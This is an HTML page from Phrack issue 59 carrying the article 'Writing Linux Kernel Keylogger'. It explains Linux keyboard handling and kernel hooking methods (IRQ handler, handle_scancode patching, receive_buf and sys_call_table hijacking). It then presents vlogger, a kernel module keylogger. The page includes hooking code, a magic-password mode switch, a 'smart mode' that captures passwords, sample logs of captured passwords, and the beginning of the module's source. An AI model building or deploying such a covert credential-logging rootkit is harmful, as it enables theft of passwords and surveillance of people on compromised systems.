@@ -1,0 +1,1742 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Writing Linux Kernel Keylogger ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a class="current" href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack59.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack59.tar.gz" title="Get current issue tar.gz">59</a> | <strong>Release date</strong> : <b>2002-07-28</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/59/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/2.html#article">Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/3.html#article">Linenoise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/4.html#article">Handling the Interrupt Descriptor Table</a></td><td align="right">kad</td></tr>
+<tr><td align="left"><a href="../../issues/59/5.html#article">Advances in kernel hacking II</a></td><td align="right">palmers</td></tr>
+<tr><td align="left"><a href="../../issues/59/6.html#article">Defeating Forensic Analysis on Unix</a></td><td align="right">the grugq</td></tr>
+<tr><td align="left"><a href="../../issues/59/7.html#article">Advances in format string exploitation</a></td><td align="right">riq &amp; gera</td></tr>
+<tr><td align="left"><a href="../../issues/59/8.html#article">Runtime process infection</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/59/9.html#article">Bypassing PaX ASLR protection</a></td><td align="right">Tyler Durden</td></tr>
+<tr><td align="left"><a href="../../issues/59/10.html#article">Execution path analysis: finding kernel based rootkits</a></td><td align="right">Jan K. Rutkowski</td></tr>
+<tr><td align="left"><a href="../../issues/59/11.html#article">Cuts like a knife, SSHarp</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/59/12.html#article">Building ptrace injecting shellcodes</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/59/13.html#article">Linux/390 shellcode development</a></td><td align="right">johnny cyberpunk</td></tr>
+<tr><td align="left"><a href="../../issues/59/14.html#article">Writing Linux Kernel Keylogger</a></td><td align="right">rd</td></tr>
+<tr><td align="left"><a href="../../issues/59/15.html#article">CRYPTOGRAPHIC RANDOM NUMBER GENERATORS</a></td><td align="right">DrMungkee</td></tr>
+<tr><td align="left"><a href="../../issues/59/16.html#article">Playing with Windows /dev/(k)mem</a></td><td align="right">crazylord</td></tr>
+<tr><td align="left"><a href="../../issues/59/17.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/59/18.html#article">Phrack magazine extraction utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Writing Linux Kernel Keylogger</div>
+<div class="opt-bottom"> <strong>Author</strong> : rd</div>
+<pre>                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3b, Phile #0x0e of 0x12
+
+
+|=-----------------=[ Writing Linux Kernel Keylogger ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------=[ rd &lt;rd@thehackerschoice.com&gt; ]=-------------------=|
+|=------------------------=[ June 19th, 2002 ]=--------------------------=|
+
+--[ Contents
+
+ 1 - Introduction
+
+ 2 - How Linux keyboard driver work
+
+ 3 - Kernel based keylogger approaches
+   3.1 - Interrupt handler
+   3.2 - Function hijacking
+       3.2.1 - handle_scancode
+       3.2.2 - put_queue
+       3.2.3 - receive_buf
+       3.2.4 - tty_read
+       3.2.5 - sys_read/sys_write
+
+ 4 - vlogger
+   4.1 - The syscall/tty approach
+   4.2 - Features
+   4.3 - How to use
+
+ 5 - Greets
+
+ 6 - References
+
+ 7 - Keylogger source
+
+
+
+
+--[ 1 - Introduction
+
+  This article is divided into two parts.  The first part of the paper
+gives an overview on how the linux keyboard driver work, and discusses
+methods that can be used to create a kernel based keylogger.  This part
+will be useful for those who want to write a kernel based keylogger, or to
+write their own keyboard driver (for supporting input of non-supported
+language in linux environment, ...) or to program taking advantage of many
+features in the Linux keyboard driver.
+
+  The second part presents detail of vlogger, a smart kernel based linux
+keylogger, and how to use it.  Keylogger is a very interesting code being
+used widely in honeypots, hacked systems, ... by white and black hats.  As
+most of us known, besides user space keyloggers (such as iob, uberkey,
+unixkeylogger, ...), there are some kernel based keyloggers.  The earliest
+kernel based keylogger is linspy of halflife which was published in Phrack
+50 (see [4]).  And the recent kkeylogger is presented in 'Kernel Based
+Keylogger' paper by mercenary (see [7]) that I found when was writing this
+paper.  The common method of those kernel based keyloggers using is to log
+user keystrokes by intercepting sys_read or sys_write system call.
+However, this approach is quite unstable and slowing down the whole system
+noticeably because sys_read (or sys_write) is the generic read/write
+function of the system; sys_read is called whenever a process wants to read
+something from devices (such as keyboard, file, serial port, ...).  In
+vlogger, I used a better way to implement it that hijacks the tty buffer
+processing function.
+
+  The reader is supposed to possess the knowledge on Linux Loadable Kernel
+Module.  Articles [1] and [2] are recommended to read before further
+reading.
+
+
+--[ 2 - How Linux keyboard driver work
+
+  Lets take a look at below figure to know how user inputs from console
+keyboard are processed:
+
+  _____________            _________             _________         
+ /             \ put_queue|         |receive_buf|         |tty_read
+/handle_scancode\--------&gt;|tty_queue|----------&gt;|tty_ldisc|-------&gt;
+\               /         |         |           |buffer   |        
+ \_____________/          |_________|           |_________|        
+
+     _________          ____________
+    |         |sys_read|            |
+---&gt;|/dev/ttyX|-------&gt;|user process|
+    |         |        |            |
+    |_________|        |____________|
+
+
+                            Figure 1
+
+  First, when you press a key on the keyboard, the keyboard will send
+corresponding scancodes to keyboard driver.  A single key press can produce
+a sequence of up to six scancodes.
+
+  The handle_scancode() function in the keyboard driver parses the stream
+of scancodes and converts it into a series of key press and key release
+events called keycode by using a translation-table via kbd_translate()
+function.  Each key is provided with a unique keycode k in the range 1-127.
+Pressing key k produces keycode k, while releasing it produces keycode
+k+128. 
+
+  For example, keycode of 'a' is 30. Pressing key 'a' produces keycode 30.
+Releasing 'a' produces keycode 158 (128+30).
+
+  Next, keycodes are converted to key symbols by looking them up on the
+appropriate keymap.  This is a quite complex process. There are eight
+possible modifiers (shift keys - Shift , AltGr, Control, Alt, ShiftL,
+ShiftR, CtrlL and CtrlR), and the combination of currently active modifiers
+and locks determines the keymap used.
+
+  After the above handling, the obtained characters are put into the raw
+tty queue - tty_flip_buffer.
+
+  In the tty line discipline, receive_buf() function is called periodically
+to get characters from tty_flip_buffer then put them into tty read queue.
+
+  When user process want to get user input, it calls read() function on
+stdin of the process. sys_read() function will calls read() function
+defined in file_operations structure (which is pointed to tty_read) of
+corresponding tty (ex /dev/tty0) to read input characters and return to the
+process.
+
+  The keyboard driver can be in one of 4 modes:
+	- scancode (RAW MODE): the application gets scancodes for input.  
+	It is used by applications that implement their own keyboard 
+	driver (ex: X11)
+
+	- keycode (MEDIUMRAW MODE): the application gets information on
+	which keys (identified by their keycodes) get pressed and 
+	released.
+
+	- ASCII (XLATE MODE): the application effectively gets the 
+	characters as defined by the keymap, using an 8-bit encoding.
+
+	- Unicode (UNICODE MODE): this mode only differs from the ASCII 
+	mode by allowing the user to compose UTF8 unicode characters by 
+	their decimal value, using Ascii_0 to Ascii_9, or their 
+	hexadecimal (4-digit) value, using Hex_0 to Hex_9.  A keymap can 
+	be set up to produce UTF8 sequences (with a U+XXXX pseudo-symbol, 
+	where each X is an hexadecimal digit). 
+
+  Those modes influence what type of data that applications will get as
+keyboard input.  For more details on scancode, keycode and keymaps, please
+read [3].
+
+
+--[ 3 - Kernel based keylogger approaches
+
+  We can implement a kernel based keylogger in two ways by writing our own
+keyboard interrupt handler or hijacking one of input processing functions. 
+
+
+----[ 3.1 - Interrupt handler
+
+  To log keystrokes, we will use our own keyboard interrupt handler.  Under
+Intel architectures, the IRQ of the keyboard controlled is IRQ 1.  When
+receives a keyboard interrupt, our own keyboard interrupt handler read the
+scancode and keyboard status.  Keyboard events can be read and written via
+port 0x60(Keyboard data register) and 0x64(Keyboard status register).
+
+/* below code is intel specific */
+#define KEYBOARD_IRQ 1 
+#define KBD_STATUS_REG 0x64 
+#define KBD_CNTL_REG 0x64 
+#define KBD_DATA_REG 0x60 
+
+#define kbd_read_input() inb(KBD_DATA_REG) 
+#define kbd_read_status() inb(KBD_STATUS_REG) 
+#define kbd_write_output(val) outb(val, KBD_DATA_REG) 
+#define kbd_write_command(val) outb(val, KBD_CNTL_REG) 
+
+/* register our own IRQ handler */
+request_irq(KEYBOARD_IRQ, my_keyboard_irq_handler, 0, &quot;my keyboard&quot;, NULL);
+
+In my_keyboard_irq_handler():
+	scancode = kbd_read_input(); 
+	key_status = kbd_read_status(); 
+	log_scancode(scancode);
+
+  This method is platform dependent.  So it won't be portable among
+platforms.  And you have to be very careful with your interrupt handler if
+you don't want to crash your box ;)
+
+
+----[ 3.2 - Function hijacking
+
+   Based on the Figure 1, we can implement our keylogger to log user inputs
+by hijacking one of handle_scancode(), put_queue(), receive_buf(),
+tty_read() and sys_read() functions.  Note that we can't intercept
+tty_insert_flip_char() function because it is an INLINE function.
+
+
+------[ 3.2.1 - handle_scancode
+
+  This is the entry function of the keyboard driver (see keyboard.c).  It
+handles scancodes which are received from keyboard.
+
+# /usr/src/linux/drives/char/keyboard.c
+void handle_scancode(unsigned char scancode, int down);
+
+  We can replace original handle_scancode() function with our own to logs
+all scancodes.  But handle_scancode() function is not a global and exported
+function.  So to do this, we can use kernel function hijacking technique
+introduced by Silvio (see [5]).
+
+/* below is a code snippet written by Plasmoid */
+static struct semaphore hs_sem, log_sem;
+static int logging=1;
+
+#define CODESIZE 7
+static char hs_code[CODESIZE];
+static char hs_jump[CODESIZE] =
+       &quot;\xb8\x00\x00\x00\x00&quot;      /*      movl   $0,%eax  */
+       &quot;\xff\xe0&quot;                  /*      jmp    *%eax    */
+   ;
+
+void (*handle_scancode) (unsigned char, int) =
+        (void (*)(unsigned char, int)) HS_ADDRESS;
+
+void _handle_scancode(unsigned char scancode, int keydown)
+{
+       if (logging &amp;&amp; keydown)
+          log_scancode(scancode, LOGFILE);
+    
+       /*
+        * Restore first bytes of the original handle_scancode code.  Call
+        * the restored function and re-restore the jump code.  Code is
+        * protected by semaphore hs_sem, we only want one CPU in here at a
+        * time.
+        */     
+       down(&amp;hs_sem);
+    
+       memcpy(handle_scancode, hs_code, CODESIZE);
+       handle_scancode(scancode, keydown);
+       memcpy(handle_scancode, hs_jump, CODESIZE);
+    
+       up(&amp;hs_sem);
+}
+
+HS_ADDRESS is set by the Makefile executing this command
+HS_ADDRESS=0x$(word 1,$(shell ksyms -a | grep handle_scancode))
+
+  Similar to method presented in 3.1, the advantage of this method is the
+ability to log keystrokes under X and the console, no matter if a tty is
+invoked or not.  And you will know exactly what key is pressed on the
+keyboard (including special keys such as Control, Alt, Shift, Print Screen,
+...).  But this method is platform dependent and won't be portable among
+platforms.  This method also can't log keystroke of remote sessions and is
+quite complex for building an advance logger.
+
+
+------[ 3.2.2 - put_queue
+
+  This function is called by handle_scancode() function to put characters
+into tty_queue. 
+
+# /usr/src/linux/drives/char/keyboard.c
+void put_queue(int ch);
+ 
+  To intercept this function, we can use the above technique as in section
+(3.2.1).
+
+
+------[ 3.2.3 - receive_buf
+
+  receive_buf() function is called by the low-level tty driver to send
+characters received by the hardware to the line discipline for processing.
+
+# /usr/src/linux/drivers/char/n_tty.c */
+static void n_tty_receive_buf(struct tty_struct *tty, const 
+				unsigned char *cp, char *fp, int count)
+
+cp is a pointer to the buffer of input character received by the device.
+fp is a pointer to a pointer of flag bytes which indicate whether a
+character was received with a parity error, etc.
+
+Lets take a deeper look into tty structures
+
+# /usr/include/linux/tty.h
+struct tty_struct {
+	int	magic;
+	struct tty_driver driver;
+	struct tty_ldisc ldisc;
+	struct termios *termios, *termios_locked;
+	...
+}
+
+# /usr/include/linux/tty_ldisc.h
+struct tty_ldisc {
+	int	magic;
+	char	*name;
+	...	
+	void	(*receive_buf)(struct tty_struct *, 
+			const unsigned char *cp, char *fp, int count);
+	int	(*receive_room)(struct tty_struct *);
+	void	(*write_wakeup)(struct tty_struct *);
+};
+
+  To intercept this function, we can save the original tty receive_buf()
+function then set ldisc.receive_buf to our own new_receive_buf() function
+in order to logging user inputs. 
+
+Ex: to log inputs on the tty0
+
+int fd = open(&quot;/dev/tty0&quot;, O_RDONLY, 0);
+struct file *file = fget(fd);
+struct tty_struct *tty = file-&gt;private_data;
+old_receive_buf = tty-&gt;ldisc.receive_buf;
+tty-&gt;ldisc.receive_buf = new_receive_buf;
+
+void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
+						char *fp, int count)
+{	
+	logging(tty, cp, count); 	//log inputs
+
+	/* call the original receive_buf */
+	(*old_receive_buf)(tty, cp, fp, count);
+}
+
+
+------[ 3.2.4 - tty_read
+
+  This function is called when a process wants to read input characters
+from a tty via sys_read() function.
+
+# /usr/src/linux/drives/char/tty_io.c
+static ssize_t tty_read(struct file * file, char * buf, size_t count, 
+				loff_t *ppos)
+
+static struct file_operations tty_fops = {
+	llseek:		tty_lseek,
+	read:		tty_read,
+	write:		tty_write,
+	poll:		tty_poll,
+	ioctl:		tty_ioctl,
+	open:		tty_open,
+	release:	tty_release,
+	fasync:		tty_fasync,
+};
+
+To log inputs on the tty0:
+
+int fd = open(&quot;/dev/tty0&quot;, O_RDONLY, 0);
+struct file *file = fget(fd);	
+old_tty_read = file-&gt;f_op-&gt;read;
+file-&gt;f_op-&gt;read = new_tty_read;
+
+
+------[ 3.2.5 - sys_read/sys_write
+
+  We will intercept sys_read/sys_write system calls to redirect it to our
+own code which logs the content of the read/write calls.  This method was
+presented by halflife in Phrack 50 (see [4]).  I highly recommend reading
+that paper and a great article written by pragmatic called &quot;Complete Linux
+Loadable Kernel Modules&quot; (see [2]).
+
+The code to intercept sys_read/sys_write will be something like this:
+
+extern void *sys_call_table[];
+original_sys_read = sys_call_table[__NR_read];
+sys_call_table[__NR_read] = new_sys_read;
+
+
+--[ 4 - vlogger
+
+  This part will introduce my kernel keylogger which is used method
+described in section 3.2.3 to acquire more abilities than common keyloggers
+used sys_read/sys_write systemcall replacement approach.  I have tested the
+code with the following versions of linux kernel: 2.4.5, 2.4.7, 2.4.17 and
+2.4.18. 
+
+
+----[ 4.1 - The syscall/tty approach
+
+  To logging both local (logged from console) and remote sessions, I chose
+the method of intercepting receive_buf() function (see 3.2.3).
+
+  In the kernel, tty_struct and tty_queue structures are dynamically
+allocated only when the tty is open.  Thus, we also have to intercept
+sys_open syscall to dynamically hooking the receive_buf() function of each
+tty or pty when it's invoked.
+
+// to intercept open syscall
+original_sys_open = sys_call_table[__NR_open];
+sys_call_table[__NR_open] = new_sys_open;
+
+// new_sys_open()
+asmlinkage int new_sys_open(const char *filename, int flags, int mode)
+{
+...
+	// call the original_sys_open
+	ret = (*original_sys_open)(filename, flags, mode);
+	
+	if (ret &gt;= 0) {
+		struct tty_struct * tty;
+...
+		file = fget(ret);
+		tty = file-&gt;private_data;
+		if (tty != NULL &amp;&amp; 
+...
+			tty-&gt;ldisc.receive_buf != new_receive_buf) {
+...
+				// save the old receive_buf			
+				old_receive_buf = tty-&gt;ldisc.receive_buf;
+...
+
+		       /* 
+		        * init to intercept receive_buf of this tty
+		        * tty-&gt;ldisc.receive_buf = new_receive_buf;
+		        */
+			init_tty(tty, TTY_INDEX(tty));
+		}
+...
+}
+
+// our new receive_buf() function
+void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, 
+						char *fp, int count)
+{
+	if (!tty-&gt;real_raw &amp;&amp; !tty-&gt;raw)	// ignore raw mode
+		// call our logging function to log user inputs 
+		vlogger_process(tty, cp, count); 
+	// call the original receive_buf
+	(*old_receive_buf)(tty, cp, fp, count);
+}
+
+
+----[ 4.2 - Features
+
+  - Logs both local and remote sessions (via tty &amp; pts)
+
+  - Separate logging for each tty/session.  Each tty has their own logging
+    buffer.
+
+  - Nearly support all special chars such as arrow keys (left, right, up,
+    down), F1 to F12, Shift+F1 to Shift+F12, Tab, Insert, Delete, End,
+    Home, Page Up, Page Down, BackSpace, ... 
+
+  - Support some line editing keys included CTRL-U and BackSpace.
+
+  - Timestamps logging, timezone supported (ripped off some codes from
+    libc).
+
+  - Multiple logging modes
+
+	o dumb mode: logs all keystrokes
+
+	o smart mode: detects password prompt automatically to log
+	user/password only.  I used the similar technique presented in
+	&quot;Passive Analysis of SSH (Secure Shell) Traffic&quot; paper by Solar
+	Designer and Dug Song (see [6]).  When the application turns input
+	echoing off, we assume that it is for entering a password.
+
+	o normal mode: disable logging
+
+You can switch between logging modes by using a magic password.
+
+#define VK_TOGLE_CHAR	29	// CTRL-]
+#define MAGIC_PASS	&quot;31337&quot;	// to switch mode, type MAGIC_PASS 
+				// then press VK_TOGLE_CHAR key
+
+----[ 4.3 - How to use
+
+Change the following options
+
+// directory to store log files
+#define LOG_DIR &quot;/tmp/log&quot;
+
+// your local timezone
+#define TIMEZONE	7*60*60	// GMT+7
+
+// your magic password
+#define MAGIC_PASS	&quot;31337&quot; 
+
+Below is how the log file looks like:
+
+[root@localhost log]# ls -l
+total 60
+-rw-------    1 root     root          633 Jun 19 20:59 pass.log
+-rw-------    1 root     root        37593 Jun 19 18:51 pts11
+-rw-------    1 root     root           56 Jun 19 19:00 pts20
+-rw-------    1 root     root          746 Jun 19 20:06 pts26
+-rw-------    1 root     root          116 Jun 19 19:57 pts29
+-rw-------    1 root     root         3219 Jun 19 21:30 tty1
+-rw-------    1 root     root        18028 Jun 19 20:54 tty2
+
+---in dumb mode
+[root@localhost log]# head tty2		// local session
+&lt;19/06/2002-20:53:47 uid=501 bash&gt; pwd
+&lt;19/06/2002-20:53:51 uid=501 bash&gt; uname -a
+&lt;19/06/2002-20:53:53 uid=501 bash&gt; lsmod
+&lt;19/06/2002-20:53:56 uid=501 bash&gt; pwd
+&lt;19/06/2002-20:54:05 uid=501 bash&gt; cd /var/log
+&lt;19/06/2002-20:54:13 uid=501 bash&gt; tail messages
+&lt;19/06/2002-20:54:21 uid=501 bash&gt; cd ~
+&lt;19/06/2002-20:54:22 uid=501 bash&gt; ls
+&lt;19/06/2002-20:54:29 uid=501 bash&gt; tty
+&lt;19/06/2002-20:54:29 uid=501 bash&gt; [UP]
+
+[root@localhost log]# tail pts11	// remote session  
+&lt;19/06/2002-18:48:27 uid=0 bash&gt; cd new
+&lt;19/06/2002-18:48:28 uid=0 bash&gt; cp -p ~/code .
+&lt;19/06/2002-18:48:21 uid=0 bash&gt; lsmod
+&lt;19/06/2002-18:48:27 uid=0 bash&gt; cd /va[TAB][^H][^H]tmp/log/
+&lt;19/06/2002-18:48:28 uid=0 bash&gt; ls -l
+&lt;19/06/2002-18:48:30 uid=0 bash&gt; tail pts11
+&lt;19/06/2002-18:48:38 uid=0 bash&gt; [UP] | more
+&lt;19/06/2002-18:50:44 uid=0 bash&gt; vi vlogertxt
+&lt;19/06/2002-18:50:48 uid=0 vi&gt; :q
+&lt;19/06/2002-18:51:14 uid=0 bash&gt; rmmod vlogger
+
+---in smart mode
+[root@localhost log]# cat pass.log
+[19/06/2002-18:28:05 tty=pts/20 uid=501 sudo]
+USER/CMD sudo traceroute yahoo.com
+PASS 5hgt6d
+PASS 
+
+[19/06/2002-19:59:15 tty=pts/26 uid=0 ssh]
+USER/CMD ssh guest@host.com
+PASS guest
+
+[19/06/2002-20:50:44 tty=pts/29 uid=504 ftp]
+USER/CMD open ftp.ilog.fr
+USER Anonymous
+PASS heh@heh
+
+[19/06/2002-20:59:54 tty=pts/29 uid=504 su]
+USER/CMD su -
+PASS asdf1234
+
+
+Please check http://www.thehackerschoice.com/ for update on the new version
+of this tool.
+
+
+--[ 5 - Greets  
+
+Thanks to plasmoid, skyper for your very useful comments
+Greets to THC, vnsecurity and all friends
+Finally, thanks to mr. thang for english corrections
+
+
+--[ 6 - References
+
+[1] Linux Kernel Module Programming
+    http://www.tldp.org/LDP/lkmpg/
+[2] Complete Linux Loadable Kernel Modules - Pragmatic
+    http://www.thehackerschoice.com/papers/LKM_HACKING.html
+[3] The Linux keyboard driver - Andries Brouwer
+    http://www.linuxjournal.com/lj-issues/issue14/1080.html
+[4] Abuse of the Linux Kernel for Fun and Profit - Halflife
+    http://www.phrack.com/phrack/50/P50-05
+[5] Kernel function hijacking - Silvio Cesare
+    http://www.big.net.au/~silvio/kernel-hijack.txt
+[6] Passive Analysis of SSH (Secure Shell) Traffic - Solar Designer 
+    http://www.openwall.com/advisories/OW-003-ssh-traffic-analysis.txt
+[7] Kernel Based Keylogger - Mercenary
+    http://packetstorm.decepticons.org/UNIX/security/kernel.keylogger.txt
+
+--[ 7 - Keylogger sources
+
+&lt;++&gt; vlogger/Makefile
+#
+#  vlogger 1.0 by rd
+#
+#  LOCAL_ONLY		logging local session only. Doesn't intercept
+#			sys_open system call
+#  DEBUG		Enable debug. Turn on this options will slow
+#			down your system
+#
+
+KERNELDIR =/usr/src/linux
+include $(KERNELDIR)/.config
+MODVERFILE = $(KERNELDIR)/include/linux/modversions.h
+
+MODDEFS = -D__KERNEL__ -DMODULE -DMODVERSIONS
+CFLAGS = -Wall -O2 -I$(KERNELDIR)/include -include $(MODVERFILE) \
+	-Wstrict-prototypes -fomit-frame-pointer -pipe \
+	-fno-strength-reduce -malign-loops=2 -malign-jumps=2 \
+	-malign-functions=2
+
+all : vlogger.o
+
+vlogger.o: vlogger.c
+	$(CC) $(CFLAGS) $(MODDEFS) -c $^ -o $@
+
+clean:
+	rm -f *.o
+&lt;--&gt;
+&lt;++&gt; vlogger/vlogger.c
+/*
+ *  vlogger 1.0
+ *
+ *  Copyright (C) 2002 rd &lt;rd@vnsecurity.net&gt;
+ *
+ *  Please check http://www.thehackerschoice.com/ for update
+ *
+ *  This program is free software; you can redistribute it and/or modify
+ *  it under the terms of the GNU General Public License as published by
+ *  the Free Software Foundation; either version 2 of the License, or
+ *  (at your option) any later version
+ *
+ *  This program is distributed in the hope that it will be useful, but 
+ *  WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU 
+ *  General Public License for more details.
+ *
+ *  Greets to THC &amp; vnsecurity
+ *
+ */
+
+#define __KERNEL_SYSCALLS__
+#include &lt;linux/version.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/smp_lock.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/unistd.h&gt;
+#include &lt;linux/string.h&gt;
+#include &lt;linux/file.h&gt;
+#include &lt;asm/uaccess.h&gt;
+#include &lt;linux/proc_fs.h&gt;
+#include &lt;asm/errno.h&gt;
+#include &lt;asm/io.h&gt;
+
+#ifndef KERNEL_VERSION
+#define KERNEL_VERSION(a,b,c) (((a) &lt;&lt; 16) + ((b) &lt;&lt; 8) + (c))
+#endif
+
+#if LINUX_VERSION_CODE &gt;= KERNEL_VERSION(2,4,9)
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;rd@vnsecurity.net&quot;);
+#endif
+
+#define MODULE_NAME &quot;vlogger &quot;
+#define MVERSION &quot;vlogger 1.0 - by rd@vnsecurity.net\n&quot;
+
+#ifdef DEBUG
+#define DPRINT(format, args...) printk(MODULE_NAME format, ##args)
+#else
+#define DPRINT(format, args...)
+#endif
+
+#define N_TTY_NAME &quot;tty&quot;
+#define N_PTS_NAME &quot;pts&quot;
+#define MAX_TTY_CON 8
+#define MAX_PTS_CON 256
+#define LOG_DIR &quot;/tmp/log&quot;
+#define PASS_LOG LOG_DIR &quot;/pass.log&quot;
+
+#define TIMEZONE 7*60*60	// GMT+7
+
+#define ESC_CHAR 27
+#define BACK_SPACE_CHAR1 127	// local
+#define BACK_SPACE_CHAR2 8	// remote
+
